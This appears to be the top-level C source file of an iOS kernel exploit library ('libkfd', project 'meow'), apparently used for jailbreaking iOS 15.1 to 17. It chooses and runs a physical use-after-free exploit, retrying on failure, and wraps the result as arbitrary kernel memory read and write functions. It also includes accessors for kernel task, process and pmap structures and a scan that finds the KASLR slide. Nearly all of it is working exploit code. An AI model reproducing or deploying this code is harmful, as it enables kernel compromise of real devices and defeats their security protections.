//
//  libkfd.c
//  meow
//
//  Created by doraaa on 2023/11/24.
//

#include "libkfd.h"

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"
#include "libkfd/krkw/IOSurface_shared.h"

#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <mach-o/getsect.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <mach-o/reloc.h>

bool isarm64e(void) {
    int ptrAuthVal = 0;
    size_t len = sizeof(ptrAuthVal);
    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
    if(ptrAuthVal != 0)
        return true;
    return false;
}

int isAvailable(void) {
    int ptrAuthVal = 0;
    size_t len = sizeof(ptrAuthVal);
    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
    if (@available(iOS 17.0, *)) {
        return 12;
    }
    if (@available(iOS 16.4, *)) {
        if (isarm64e())
            return 11;
        return 10;
    }
    if (@available(iOS 16.2, *)) {
        if (isarm64e())
            return 9;
        return 8;
    }
    if (@available(iOS 16.0, *)) {
        if (isarm64e())
            return 7;
        return 6;
    }
    if (@available(iOS 15.4, *)) {
        if (isarm64e())
            return 5;
        return 4;
    }
    if (@available(iOS 15.2, *)) {
        if (isarm64e())
            return 3;
        return 2;
    }
    if (@available(iOS 15.1, *)) {
        if (isarm64e())
            return 1;
        return 0;
    }
    return -1;
}

struct kfd* kfd_init(uint64_t exploit_type) {
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, exploit_type);
    krkw_init(kfd);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd) {
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

uint64_t kopen(uint64_t exploit_type) {
    int fail = -1;
    
    struct kfd* kfd = kfd_init(exploit_type);
    
    kfd->info.env.exploit_type = exploit_type;

retry:
    puaf_run(kfd);
    
    fail = krkw_run(kfd);
    
    if(fail && (exploit_type == MEOW_EXPLOIT_LANDA)) {
        // TODO: fix memory leak
        puaf_free(kfd);
        info_free(kfd);
        bzero(kfd, sizeof(struct kfd));
        info_init(kfd);
        puaf_init(kfd, exploit_type);
        krkw_init(kfd);
        perf_init(kfd);
        goto retry;
    }
    
    info_run(kfd);
    puaf_cleanup(kfd);
    
    return (uint64_t)(kfd);
}

void kread_kfd(uint64_t kfd, uint64_t va, void* ua, uint64_t size) {
    krkw_kread((struct kfd*)(kfd), va, ua, size);
}

void kwrite_kfd(uint64_t kfd, const void* ua, uint64_t va, uint64_t size) {
    krkw_kwrite((struct kfd*)(kfd), (void*)ua, va, size);
}

void kclose(uint64_t kfd) {
    kfd_free((struct kfd*)(kfd));
}

void kreadbuf_kfd(uint64_t va, void* ua, size_t size) {
    kread_kfd(_kfd, va, ua, size);
}

void kwritebuf_kfd(uint64_t va, const void* ua, size_t size) {
    kwrite_kfd(_kfd, ua, va, size);
}

uint64_t kread64_kfd(uint64_t va) {
    uint64_t u;
    kread_kfd(_kfd, va, &u, 8);
    return u;
}

uint32_t kread32_kfd(uint64_t va) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u32[0];
}

uint16_t kread16_kfd(uint64_t va) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u16[0];
}

uint8_t kread8_kfd(uint64_t va) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    return u.u8[0];
}

void kwrite64_kfd(uint64_t va, uint64_t val) {
    uint64_t u[1] = {};
    u[0] = val;
    kwrite_kfd((uint64_t)(_kfd), &u, va, 8);
}

void kwrite32_kfd(uint64_t va, uint32_t val) {
    union {
        uint32_t u32[2];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u32[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite16_kfd(uint64_t va, uint16_t val) {
    union {
        uint16_t u16[4];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u16[0] = val;
    kwrite64_kfd(va, u.u64);
}

void kwrite8_kfd(uint64_t va, uint8_t val) {
    union {
        uint8_t u8[8];
        uint64_t u64;
    } u;
    u.u64 = kread64_kfd(va);
    u.u8[0] = val;
    kwrite64_kfd(va, u.u64);
}

uint64_t get_kaslr_slide(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_slide;
}

uint64_t get_kernel_proc(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_proc;
}

uint64_t get_kernel_task(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_task;
}

uint64_t get_current_proc(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_proc;
}

uint64_t get_current_task(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_task;
}

uint64_t get_kernel_pmap(void) {
    return ((struct kfd*)_kfd)->info.kernel.kernel_pmap;
}

uint64_t get_current_pmap(void) {
    return ((struct kfd*)_kfd)->info.kernel.current_pmap;
}

uint64_t get_kw_object_uaddr(void) {
    return ((struct kfd*)_kfd)->kwrite.krkw_object_uaddr;
}

uint64_t get_kernel_slide(void) {
    static uint64_t _kernel_slide = 0;
    
    if(!_kernel_slide) {
        
        // get kslide
        uint64_t field_uaddr = (uint64_t)(get_kw_object_uaddr()) + 0; // isa
        uint64_t textPtr = *(volatile uint64_t*)(field_uaddr);
        
        struct mach_header_64 kernel_header;
        
        uint64_t _kernel_base = 0;
        
        for (uint64_t page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
            struct mach_header_64 candidate_header;
            kreadbuf_kfd(page, &candidate_header, sizeof(candidate_header));
            
            if (candidate_header.magic == 0xFEEDFACF) {
                kernel_header = candidate_header;
                _kernel_base = page;
                break;
            }
        }
        
        if (kernel_header.filetype == 0xB) {
            // if we found 0xB, rescan forwards instead
            // don't ask me why (<=A10 specific issue)
            for (uint64_t page = textPtr & ~PAGE_MASK; true; page += 0x4000) {
                struct mach_header_64 candidate_header;
                kreadbuf_kfd(page, &candidate_header, sizeof(candidate_header));
                if (candidate_header.magic == 0xFEEDFACF) {
                    kernel_header = candidate_header;
                    _kernel_base = page;
                    break;
                }
            }
        }
        
        _kernel_slide = _kernel_base - KERNEL_BASE_ADDRESS;
        ((struct kfd*)_kfd)->info.kernel.kernel_slide = _kernel_slide;
    }
    
    return _kernel_slide;
}
